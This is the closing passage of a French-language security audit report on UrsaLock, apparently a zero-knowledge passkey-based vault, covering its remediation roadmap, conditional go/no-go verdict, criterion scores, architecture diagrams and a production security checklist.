- CSP stricte + HSTS
- WebAuthn server-side verification
- Optimistic locking enforcement
- Audit @z-base dependencies

#### Phase 2: Sync Improvements (2-3 weeks)
- Conflict resolution UI
- 3-way merge ou CRDTs
- Offline queue improvements
- Rate limiting

#### Phase 3: Key Management (3-4 weeks)
- Key rotation system
- Multi-device passkey support
- Recovery options (Shamir SSS)

#### Phase 4: Advanced Security (ongoing)
- Audit logging
- Intrusion detection
- Quantum-resistant crypto monitoring

---

## 7. Conclusion

### Verdict Final

UrsaLock présente une **architecture zero-knowledge solide** avec une excellente utilisation des standards modernes (Web Crypto API, WebAuthn PRF, AES-256-GCM). Le design SOLID rend le code maintenable et testable.

**Cependant**, plusieurs **faiblesses critiques** doivent être adressées avant tout déploiement en production:

1. **Absence de CSP** → XSS critique
2. **Dépendances non auditées** → Supply chain risk
3. **Sync naïf** → Perte de données possible
4. **Pas de rotation de clés** → Forward secrecy inexistante

### Recommandation Finale

**🟡 GO / NO-GO: CONDITIONNEL**

- ✅ **GO** pour usage personnel / beta privée
- ⚠️ **NO-GO** pour production publique sans les fixes P0
- ✅ **GO** pour production après implémentation des recommandations P0 + P1

### Score Global

**Architecture: 7.5/10**

| Critère | Score | Justification |
|---------|-------|---------------|
| Zero-Knowledge | 8/10 | Excellent design, quelques metadata leaks |
| Cryptographie | 9/10 | Standards solides, implémentation correcte |
| Trust Model | 6/10 | Bonnes séparations mais dépendances non auditées |
| Sync Protocol | 5/10 | Fonctionnel mais conflits mal gérés |
| Key Management | 6/10 | Pas de rotation, recovery limitée |
| Security | 6/10 | Bonnes bases mais manque CSP, rate limiting |

**Potentiel après fixes: 9/10** 🚀

---

## Annexes

### A. Diagrammes d'Architecture Détaillés

#### A.1 Data Flow (Registration)

```
┌─────────┐
│ Browser │
└────┬────┘
     │
     │ 1. Click "Sign Up"
     ▼
┌──────────────────────────────────────────┐
│ VaultClient.signUp({ usePasskey: true })│
└────┬─────────────────────────────────────┘
     │
     │ 2. Delegate to PasskeyAuth
     ▼
┌──────────────────────────────────────────┐
│ ZKCredentials.registerCredential()       │  
│   - Calls navigator.credentials.create() │
│   - PRF extension enabled                │
└────┬─────────────────────────────────────┘
     │
     │ 3. User biometric/PIN
     ▼
┌──────────────────────────────────────────┐
│ Hardware Authenticator                   │
│   - Generate passkey (ECDSA P-256)      │
│   - Derive PRF secret (256 bits)        │
│   - Return credentialId + publicKey     │
└────┬─────────────────────────────────────┘
     │
     │ 4. Credential created
     ▼
┌──────────────────────────────────────────┐
│ ZKCredentials.discoverCredential()       │
│   - Re-authenticate to get PRF output   │
│   - Derive cipherJwk (AES-256 key)      │
└────┬─────────────────────────────────────┘
     │
     │ 5. credential.cipherJwk ready
     ▼
┌──────────────────────────────────────────┐
│ POST /auth/zkc/register                  │
│   { opaqueId, displayName }              │
└────┬─────────────────────────────────────┘
     │
     │ 6. Server creates user
     ▼
┌──────────────────────────────────────────┐
│ Server: createUser({ opaqueId })        │
│   - INSERT INTO users                   │
│   - Generate JWT token                  │
└────┬─────────────────────────────────────┘
     │
     │ 7. Return { user, token }
     ▼
┌──────────────────────────────────────────┐
│ Client stores:                           │
│   - token → localStorage                 │
│   - credential.cipherJwk → RAM           │
│   - user → localStorage                  │
└──────────────────────────────────────────┘
```

#### A.2 Sync Engine State Machine

```
                    ┌──────────┐
                    │   IDLE   │
                    └────┬─────┘
                         │
                         │ store.setState()
                         ▼
                    ┌──────────┐
                    │ DEBOUNCE │ (3s)
                    └────┬─────┘
                         │
                         │ timeout
                         ▼
                    ┌──────────┐
           ┌────────│ SYNCING  │────────┐
           │        └────┬─────┘        │
           │             │              │
   offline │             │ GET /vault   │ server error
           │             ▼              │
           │        ┌──────────┐        │
           │        │ COMPARE  │        │
           │        └────┬─────┘        │
           │             │              │
           │    ┌────────┴────────┐     │
           │    ▼                 ▼     │
           │ ┌──────┐         ┌──────┐ │
           │ │ PULL │         │ PUSH │ │
           │ └──┬───┘         └───┬──┘ │
           │    │                 │    │
           │    └────────┬────────┘    │
           │             ▼             │
           ▼        ┌──────────┐       ▼
      ┌──────────┐  │  SYNCED  │  ┌──────────┐
      │ OFFLINE  │  └────┬─────┘  │  ERROR   │
      └────┬─────┘       │        └────┬─────┘
           │             │             │
           │   online    │  new change │ retry
           └─────────────┴─────────────┘
                         │
                         ▼
                    ┌──────────┐
                    │   IDLE   │
                    └──────────┘
```

### B. Fichiers Critiques à Auditer en Priorité

1. **Crypto Layer** (P0)
   - `packages/crypto/src/jwk.ts` - Chiffrement JWK
   - `packages/crypto/src/aes.ts` - AES-GCM wrapper
   - `packages/crypto/src/providers/web-crypto.ts` - Web Crypto impl

2. **Auth Layer** (P0)
   - `packages/client/src/passkey.ts` - WebAuthn PRF
   - `packages/server/src/api/auth/zkc.ts` - Server auth
   - `packages/server/src/features/auth/middleware.ts` - JWT validation

3. **Sync Layer** (P1)
   - `packages/zustand/src/sync.ts` - Sync engine
   - `packages/zustand/src/vault.ts` - Vault middleware
   - `packages/zustand/src/storage.ts` - Encrypted storage

4. **Dependencies** (P0)
   - `@z-base/zero-knowledge-credentials` - External audit required
   - `@z-base/cryptosuite` - External audit required

### C. Checklist de Sécurité

#### Avant Production

- [ ] CSP stricte configurée
- [ ] HSTS + security headers
- [ ] @z-base dependencies auditées
- [ ] WebAuthn server-side verification
- [ ] Rate limiting sur /auth/*
- [ ] Optimistic locking enforcement
- [ ] Error messages pas trop verbeux (pas de leak d'info)
- [ ] HTTPS obligatoire (redirect HTTP → HTTPS)
- [ ] JWT_SECRET rotation planifiée
- [ ] Backup strategy documentée
- [ ] Incident response plan
- [ ] Penetration testing

#### Post-Production

- [ ] Monitoring + alertes
- [ ] Audit logs analysis
- [ ] Dependency updates régulières
- [ ] Bug bounty program
- [ ] Security.txt configured
- [ ] Regular security audits

---

**Fin du Rapport d'Audit**

*Pour toute question ou clarification, contacter l'équipe d'audit.*
